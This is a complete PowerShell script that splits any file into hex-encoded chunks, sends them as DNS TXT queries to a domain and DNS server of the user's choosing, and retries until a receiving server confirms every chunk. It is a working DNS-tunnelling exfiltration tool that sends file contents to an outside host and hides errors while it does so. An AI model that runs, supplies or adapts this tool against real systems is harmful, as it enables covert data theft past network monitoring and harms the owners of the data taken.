# Script to break a file into chunks and send via DNS queries
# Usage: .\script.ps1 <file> [domain] [chunk_size] [dns_server] [max_parallel]

param (
    [Parameter(Mandatory=$true)]
    [string]$FilePath,
    
    [Parameter(Mandatory=$true)]
    [string]$Domain = "example.com",
    
    [Parameter(Mandatory=$false)]
    [int]$ChunkSize = 100,
    
    [Parameter(Mandatory=$false)]
    [string]$DnsServer = "",
    
    [Parameter(Mandatory=$false)]
    [int]$MaxParallel = 20
)

# Check if file exists
if (-not (Test-Path -Path $FilePath -PathType Leaf)) {
    Write-Host "Error: File '$FilePath' not found" -ForegroundColor Red
    exit 1
}

# Get filename (basename only)
$Filename = [System.IO.Path]::GetFileName($FilePath)

# Generate hash8 (8 hex characters) - using first 8 chars of file's MD5
$fullHash = (Get-FileHash -Algorithm MD5 -Path $FilePath).Hash.ToLower()
$Hash8 = $fullHash.Substring(0, 8)

# Encode filename to hex
$FilenameBytes = [System.Text.Encoding]::UTF8.GetBytes($Filename)
$FilenameHex = ($FilenameBytes | ForEach-Object { $_.ToString("x2") }) -join ""

# Get file size
$FileInfo = Get-Item -Path $FilePath
$FileSize = $FileInfo.Length

# Calculate total parts
$TotalParts = [math]::Ceiling($FileSize / $ChunkSize)

Write-Host "File: $FilePath"
Write-Host "Filename: $Filename"
Write-Host "Size: $FileSize bytes"
Write-Host "Chunk size: $ChunkSize bytes"
Write-Host "Total parts: $TotalParts"
Write-Host "Hash: $Hash8"
Write-Host "Domain: $Domain"
Write-Host "Max parallel: $MaxParallel"
Write-Host ""

# Function to split hex string into DNS labels (max 63 chars per label)
function Split-HexLabels {
    param([string]$HexStr)
    
    $result = ""
    $len = $HexStr.Length
    $i = 0
    
    while ($i -lt $len) {
        if ($result -ne "") {
            $result += "."
        }
        $chunkLen = [math]::Min(63, $len - $i)
        $result += $HexStr.Substring($i, $chunkLen)
        $i += 63
    }
    
    return $result
}

# Build start record query
# Format: filename_hex.total_parts.chunk_size.total_bytes.start.hash8.<domain>
$FilenameHexLabels = Split-HexLabels -HexStr $FilenameHex
$StartQuery = "$FilenameHexLabels.$TotalParts.$ChunkSize.$FileSize.start.$Hash8.$Domain"

Write-Host "Sending start record..."
if ($DnsServer -eq "") {
    Resolve-DnsName -Name $StartQuery -Type TXT -ErrorAction SilentlyContinue | Out-Null
} else {
    Resolve-DnsName -Name $StartQuery -Type TXT -Server $DnsServer -ErrorAction SilentlyContinue | Out-Null
}
Start-Sleep -Milliseconds 100

# Function to send a single DNS query (used in parallel)
function Send-DnsQuery {
    param(
        [int]$PartNum,
        [long]$ChunkOffset,
        [int]$ChunkSize,
        [string]$Hash8,
        [string]$Domain,
        [string]$DnsServer,
        [string]$FilePath,
        [int]$TotalParts
    )
    
    # Read chunk from file
    $FileStream = [System.IO.File]::OpenRead($FilePath)
    $ChunkLength = [math]::Min($ChunkSize, (Get-Item $FilePath).Length - $ChunkOffset)
    $Chunk = New-Object byte[] $ChunkLength
    $FileStream.Seek($ChunkOffset, [System.IO.SeekOrigin]::Begin) | Out-Null
    $FileStream.Read($Chunk, 0, $ChunkLength) | Out-Null
    $FileStream.Close()
    
    # Convert to hex string
    $ChunkHex = ($Chunk | ForEach-Object { $_.ToString("x2") }) -join ""
    
    # Split hex into DNS labels
    $ChunkHexLabels = Split-HexLabels -HexStr $ChunkHex
    
    # Build data record query
    # Format: data_hex.part_num.hash8.<domain>
    $DataQuery = "$ChunkHexLabels.$PartNum.$Hash8.$Domain"
    
    # Send DNS query
    if ($DnsServer -eq "") {
        Resolve-DnsName -Name $DataQuery -Type TXT -ErrorAction SilentlyContinue | Out-Null
    } else {
        Resolve-DnsName -Name $DataQuery -Type TXT -Server $DnsServer -ErrorAction SilentlyContinue | Out-Null
    }
    
    Write-Output "Part $PartNum/$TotalParts sent"
}

# Read file and send chunks in parallel (1-based part numbering)
Write-Host "Sending chunks in parallel (max $MaxParallel concurrent queries)..."
$PartNum = 1
$BytesRead = 0
$Jobs = @()

while ($BytesRead -lt $FileSize) {
    # Wait if we've reached max parallel jobs
    while (($Jobs | Where-Object { $_.State -eq 'Running' }).Count -ge $MaxParallel) {
        Start-Sleep -Milliseconds 10
    }
    
    # Remove completed jobs
    $Jobs = $Jobs | Where-Object { $_.State -eq 'Running' }
    
    # Start DNS query in background job
    $Job = Start-Job -ScriptBlock {
        param($PartNum, $BytesRead, $ChunkSize, $Hash8, $Domain, $DnsServer, $FilePath, $TotalParts)
        
        # Read chunk from file
        $FileStream = [System.IO.File]::OpenRead($FilePath)
        $ChunkLength = [math]::Min($ChunkSize, (Get-Item $FilePath).Length - $BytesRead)
        $Chunk = New-Object byte[] $ChunkLength
        $FileStream.Seek($BytesRead, [System.IO.SeekOrigin]::Begin) | Out-Null
        $FileStream.Read($Chunk, 0, $ChunkLength) | Out-Null
        $FileStream.Close()
        
        # Convert to hex string
        $ChunkHex = ($Chunk | ForEach-Object { $_.ToString("x2") }) -join ""
        
        # Split hex into DNS labels
        function Split-HexLabels {
            param([string]$HexStr)
            $result = ""
            $len = $HexStr.Length
            $i = 0
            while ($i -lt $len) {
                if ($result -ne "") { $result += "." }
                $chunkLen = [math]::Min(63, $len - $i)
                $result += $HexStr.Substring($i, $chunkLen)
                $i += 63
            }
            return $result
        }
        
        $ChunkHexLabels = Split-HexLabels -HexStr $ChunkHex
        
        # Build data record query
        $DataQuery = "$ChunkHexLabels.$PartNum.$Hash8.$Domain"
        
        # Send DNS query
        if ($DnsServer -eq "") {
            Resolve-DnsName -Name $DataQuery -Type TXT -ErrorAction SilentlyContinue | Out-Null
        } else {
            Resolve-DnsName -Name $DataQuery -Type TXT -Server $DnsServer -ErrorAction SilentlyContinue | Out-Null
        }
        
        Write-Output "Part $PartNum/$TotalParts sent"
    } -ArgumentList $PartNum, $BytesRead, $ChunkSize, $Hash8, $Domain, $DnsServer, $FilePath, $TotalParts
    
    $Jobs += $Job
    
    $BytesRead += $ChunkSize
    $PartNum++
}

# Wait for all jobs to complete and show output
Write-Host "Waiting for all queries to complete..."
$Jobs | Wait-Job | Out-Null
$Jobs | Receive-Job | Out-Null
$Jobs | Remove-Job

Write-Host ""
Write-Host "Initial transfer complete! Sent $TotalParts parts."

# Check for missing chunks and retry (retry indefinitely until all chunks are received)
$RetryCount = 0

while ($true) {
    # Wait 1 second for server to process
    Start-Sleep -Seconds 1
    
    # Query for missing chunks with counter prefix to avoid DNS caching
    $MissingQuery = "$RetryCount.missing.$Hash8.$Domain"
    Write-Host "Checking for missing chunks..."
    
    $MissingResponse = $null
    if ($DnsServer -eq "") {
        $MissingResponse = Resolve-DnsName -Name $MissingQuery -Type TXT -ErrorAction SilentlyContinue
    } else {
        $MissingResponse = Resolve-DnsName -Name $MissingQuery -Type TXT -Server $DnsServer -ErrorAction SilentlyContinue
    }
    
    # Parse missing chunk numbers from TXT records
    $MissingChunks = @()
    if ($MissingResponse) {
        foreach ($record in $MissingResponse) {
            if ($record.Strings) {
                foreach ($str in $record.Strings) {
                    $chunkNum = 0
                    if ([int]::TryParse($str, [ref]$chunkNum)) {
                        $MissingChunks += $chunkNum
                    }
                }
            }
        }
    }
    
    if ($MissingChunks.Count -eq 0) {
        Write-Host "All chunks received successfully!"
        break
    }
    
    # Sort missing chunks
    $MissingChunks = $MissingChunks | Sort-Object
    
    $RetryCount++
    Write-Host "Found $($MissingChunks.Count) missing chunk(s): $($MissingChunks -join ' ')"
    Write-Host "Retry attempt $RetryCount : Retrying missing chunks in parallel..."
    
    # Retry sending missing chunks in parallel (1-based)
    $RetryJobs = @()
    foreach ($chunkNum in $MissingChunks) {
        # Wait if we've reached max parallel jobs
        while (($RetryJobs | Where-Object { $_.State -eq 'Running' }).Count -ge $MaxParallel) {
            Start-Sleep -Milliseconds 10
        }
        
        # Remove completed jobs
        $RetryJobs = $RetryJobs | Where-Object { $_.State -eq 'Running' }
        
        # Calculate byte offset for this chunk (1-based part number, so subtract 1)
        $chunkOffset = ($chunkNum - 1) * $ChunkSize
        
        # Start DNS query in background job
        $Job = Start-Job -ScriptBlock {
            param($chunkNum, $chunkOffset, $ChunkSize, $Hash8, $Domain, $DnsServer, $FilePath, $FileSize)
            
            # Read chunk from file
            $FileStream = [System.IO.File]::OpenRead($FilePath)
            $ChunkLength = [math]::Min($ChunkSize, $FileSize - $chunkOffset)
            $Chunk = New-Object byte[] $ChunkLength
            $FileStream.Seek($chunkOffset, [System.IO.SeekOrigin]::Begin) | Out-Null
            $FileStream.Read($Chunk, 0, $ChunkLength) | Out-Null
            $FileStream.Close()
            
            # Convert to hex string
            $ChunkHex = ($Chunk | ForEach-Object { $_.ToString("x2") }) -join ""
            
            # Split hex into DNS labels
            function Split-HexLabels {
                param([string]$HexStr)
                $result = ""
                $len = $HexStr.Length
                $i = 0
                while ($i -lt $len) {
                    if ($result -ne "") { $result += "." }
                    $chunkLen = [math]::Min(63, $len - $i)
                    $result += $HexStr.Substring($i, $chunkLen)
                    $i += 63
                }
                return $result
            }
            
            $ChunkHexLabels = Split-HexLabels -HexStr $ChunkHex
            
            # Build data record query
            $DataQuery = "$ChunkHexLabels.$chunkNum.$Hash8.$Domain"
            
            # Send DNS query
            if ($DnsServer -eq "") {
                Resolve-DnsName -Name $DataQuery -Type TXT -ErrorAction SilentlyContinue | Out-Null
            } else {
                Resolve-DnsName -Name $DataQuery -Type TXT -Server $DnsServer -ErrorAction SilentlyContinue | Out-Null
            }
            
            Write-Output "Chunk $chunkNum retried"
        } -ArgumentList $chunkNum, $chunkOffset, $ChunkSize, $Hash8, $Domain, $DnsServer, $FilePath, $FileSize
        
        $RetryJobs += $Job
    }
    
    # Wait for all retry jobs to complete
    $RetryJobs | Wait-Job | Out-Null
    $RetryJobs | Receive-Job | Out-Null
    $RetryJobs | Remove-Job
    
    Write-Host ""
}

Write-Host ""
Write-Host "Transfer complete! File should be received as: $Filename"
